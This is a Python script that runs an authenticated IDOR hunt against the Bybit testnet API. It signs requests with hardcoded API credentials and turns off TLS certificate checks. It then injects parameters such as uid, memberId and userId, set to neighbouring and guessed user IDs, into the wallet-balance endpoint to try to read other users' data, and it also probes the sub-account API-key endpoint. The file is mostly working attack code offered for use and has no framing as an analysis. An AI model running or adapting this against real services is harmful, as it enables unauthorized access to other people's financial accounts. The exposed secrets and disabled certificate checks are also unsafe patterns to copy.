#!/usr/bin/env python3
import requests
import time
import hmac
import hashlib
import json
import urllib.parse

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api-testnet.bybit.com"
MY_UID = "527465456"

requests.packages.urllib3.disable_warnings()

def get_server_time():
    try:
        r = requests.get(f"{BASE_URL}/v5/market/time", verify=False)
        data = r.json()
        return int(data['time'])
    except:
        return int(time.time() * 1000)

# Calculate time offset
local_time = int(time.time() * 1000)
server_time = get_server_time()
TIME_OFFSET = server_time - local_time
print(f"Time offset: {TIME_OFFSET}ms")

def get_signature(payload, api_secret):
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(payload, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_request(method, endpoint, payload=None):
    if payload is None:
        payload = {}
        
    # Use server aligned time
    timestamp = str(int(time.time() * 1000) + TIME_OFFSET)
    recv_window = "20000"
    
    if method == "GET":
        params_str = "&".join([f"{k}={v}" for k, v in sorted(payload.items())])
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        full_url = f"{BASE_URL}{endpoint}?{params_str}"
        data = None
    else:
        params_str = json.dumps(payload)
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        full_url = f"{BASE_URL}{endpoint}"
        data = params_str
        
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
        "Content-Type": "application/json"
    }
    
    try:
        if method == "GET":
            r = requests.get(full_url, headers=headers, verify=False, timeout=10)
        else:
            r = requests.post(full_url, headers=headers, data=data, verify=False, timeout=10)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

print("="*80)
print("AUTHENTICATED IDOR HUNT")
print("="*80)

# 1. Check Own Balance (Baseline)
print("\n[1] Baseline Check (My Data)")
res = send_request("GET", "/v5/account/wallet-balance", {"accountType": "UNIFIED"})
print(f"My Balance Status: {res.get('retCode')}")
# print(f"My Balance Data: {str(res)[:100]}...")

if res.get('retCode') != 0:
    print("❌ Failed to get own data. Aborting IDOR check.")
    print(res)
    exit()

# 2. IDOR Attempts
print("\n[2] IDOR Attacks")
print("-" * 80)

# Target UIDs to try to access
targets = [
    str(int(MY_UID) - 1), # Previous user
    str(int(MY_UID) + 1), # Next user
    "1000001",           # Early user
    "88888888"           # Lucky user
]

# Parameters to inject
# We try to inject 'uid', 'memberId', 'user_id' into the GET parameters
injection_params = ["uid", "memberId", "userId", "subMemberId", "targetUid"]

for target in targets:
    for param in injection_params:
        # Construct payload: normal required params + injection
        payload = {
            "accountType": "UNIFIED",
            param: target
        }
        
        print(f"Testing {param}={target} ...", end="\r")
        
        res = send_request("GET", "/v5/account/wallet-balance", payload)
        
        if res.get('retCode') == 0:
            # Analyze result
            # Check if the response contains OUR uid or TARGET uid
            # Usually response structure: result -> list -> [ { "coin":... } ]
            # We need to see if there's any identifier in the response
            
            # For now, let's just compare the result with our baseline
            # If the data is DIFFERENT from our baseline, it might be a hit!
            # But wallet balance changes, so hard to compare exact JSON.
            
            # Let's look for the target UID in the text response
            res_str = json.dumps(res)
            if target in res_str:
                print(f"\n🚨 POTENTIAL IDOR! Found target UID {target} in response!")
                print(f"  Payload: {payload}")
                print(f"  Response snippet: {res_str[:200]}")
            else:
                # If response is successful but doesn't contain UID, 
                # it implies the extra param was IGNORED (safe).
                pass
        else:
            # Error means it likely validated the param or auth failed
            pass

print("\n\n[3] Sub-Account IDOR")
print("-" * 80)
# Try to access sub-account endpoints
res = send_request("GET", "/v5/user/sub-apikeys")
if res.get('retCode') == 0:
    print("Can list sub-keys (expected for main account)")
else:
    print(f"Sub-keys error: {res.get('retMsg')}")

print("\n" + "="*80)
print("IDOR SCAN COMPLETE")
